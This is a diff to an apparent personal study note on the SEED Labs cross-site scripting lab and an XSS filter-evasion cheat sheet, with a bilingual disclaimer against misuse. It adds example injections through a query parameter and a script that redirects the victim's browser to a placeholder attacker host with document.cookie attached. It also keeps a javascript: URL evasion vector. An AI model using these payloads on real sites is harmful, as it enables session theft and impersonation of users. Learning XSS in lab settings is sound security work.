@@ -16,6 +16,19 @@ toc: true
 
 [toc]
 
+
+```
+    __∧_∧__    ~~~~~
+　／(*´O｀)／＼
+／|￣∪∪￣|＼／
+　|＿＿ ＿|／
+
+por favor, no lo usar para hacer algo malo
+just learning note, please don't use it to do something wrong
+kali用得好，监狱进得早，与君共勉
+
+```
+
 ---
 
 # SEED Labs – Cross-Site Scripting Attack Lab
@@ -351,11 +364,32 @@ ff.send(params);
 # XSS Filter Evasion Cheat Sheet
 
 
+## use `query`
+
+```
+http网址www.webpage.org/task/Rule1?query=try
+http网址www.webpage.org/task/Rule1?query=<h3>Hello from XSS</h3>
+```
+
+## navigates the user's browser to a different URL
+- This script navigates the user's browser to a different URL
+- triggering an HTTP request to the attacker's server.
+- The URL includes the victim's cookies as a query parameter
+- the attacker can extract from the request when it arrives to his server.
+- Once the attacker has acquired the cookies, he can impersonate the victim and launch further attacks.
+
+```js
+<script>
+window.location='http://attacker/?cookie='+document.cookie
+</script>
+```
+![persistent-xss](https://i.imgur.com/NznIJNi.png)
+
+
 ## find different tag to use
 
 ```js
 // tag <script> <body> onclik onAnything been blocked
-
 <div style="background:url('javascript:alert(1)')">
 ```
 
